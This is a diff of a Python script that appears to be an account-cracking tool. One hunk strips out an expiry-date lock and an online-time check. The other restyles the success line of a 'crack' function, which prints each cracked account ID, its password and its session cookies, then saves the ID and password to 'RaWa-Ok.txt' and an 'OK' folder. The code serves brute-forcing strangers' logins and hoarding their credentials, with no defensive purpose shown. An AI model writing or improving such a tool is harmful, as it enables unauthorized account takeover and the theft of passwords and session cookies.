@@ -1,46 +1,4 @@
-import os, sys
-try:
-    import requests
-except:
-    os.system("pip install requests")
 
-import requests
-from datetime import datetime, time
-#Mino Created
-
-def katy_online():
-    try:
-        response = requests.get("http://worldtimeapi.org/api/ip")
-        data = response.json()
-        online_time_str = data['datetime']
-        online_time = datetime.strptime(online_time_str, '%Y-%m-%dT%H:%M:%S.%f%z')
-        return online_time.replace(second=0, microsecond=0)
-    except:
-        
-        sys.exit("Error ")
-
-#Mino Created
-local_time = datetime.now().replace(second=0, microsecond=0)
-
-#          years  / month  /  day   
-#          ساڵ     / مانگ     / رۆژ
-if datetime.now().date() < datetime(2024, 7, 1).date():
-    pass
-else:
-    sys.exit("The Tool Has been expired")
-
-
-online_time = katy_online().replace(second=0, microsecond=0)
-
-print(online_time, local_time)
-if online_time.year == local_time.year \
-    and online_time.month == local_time.month \
-    and online_time.day == local_time.day \
-    and online_time.hour == local_time.hour \
-    and online_time.minute == local_time.minute:
-    pass
-else:
-    sys.exit("The online time is different from your local time.")
 import time, datetime, os
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -698,7 +656,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r{H}\n[ + ] CRACKED NOW\n[ + ]ID : {idf}\n[ + ]PASS : {pw}\n[ + ]COOKIE :\n{kuki}')
+                print(f'\r\x1b[38;5;5m[RAWA⭐️-OK]\x1b[38;5;220m   {idf} | \x1b[38;5;7m{pw} | \x1b[38;5;48m{kuki}')
                 open('/sdcard/RaWa-Ok.txt','a').write(idf+' • '+pw+'\n')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
